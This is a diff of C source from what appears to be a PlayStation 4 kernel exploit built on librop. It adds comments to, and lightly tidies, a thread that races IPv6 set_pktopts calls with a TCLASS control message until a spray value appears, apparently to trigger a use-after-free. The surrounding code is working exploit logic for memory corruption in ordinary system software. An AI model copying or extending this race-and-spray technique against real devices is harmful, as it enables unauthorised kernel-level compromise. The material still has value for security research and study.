@@ -13,7 +13,11 @@
 #include <librop/pthread_create.h>
 #include <ps4/errno.h>
 
+// TODO: Implement some kind of way to allow for remote debugging 
+// in the form of sending messages from the ps4 to our pc...
+// but atm, this will basically do nothing...
 int printf_(const char* fmt, ...) { return 0; }
+
 #define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define IPV6_2292PKTINFO    19
@@ -74,18 +78,21 @@ int get_pktinfo(int s, char* buf) {
 
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
-    char buf[CMSG_SPACE(sizeof(int))];
+    char buf[CMSG_SPACE(sizeof(int))];    // Create a buffer to hold control messages
+    // Create a control message structure for IPv6 traffic class information.
+    // This structure will be used to specify that we are working with the IPv6 protocol
+    // and need to manipulate the traffic class (TCLASS) as ancillary data.
     struct cmsghdr* cmsg = (struct cmsghdr*)buf;
-    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
-    cmsg->cmsg_level = IPPROTO_IPV6;
-    cmsg->cmsg_type = IPV6_TCLASS;
+    cmsg->cmsg_len   = CMSG_LEN(sizeof(int));
+    cmsg->cmsg_level = IPPROTO_IPV6; // IPv6 protocol level
+    cmsg->cmsg_type  = IPV6_TCLASS;  // IPv6 traffic class type
+    // Given a pointer to the control message header "cmsg", set its data field to 0
     *(int*)CMSG_DATA(cmsg) = 0;
     while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
         if (set_pktopts(o->master_sock, buf, sizeof(buf)))
             *(volatile int*)0;
 
-    o->triggered = 1;
-    o->done1 = 1;
+    o->triggered = o->done1 = 1;
 }
 
 void* free_thread(void* arg) {
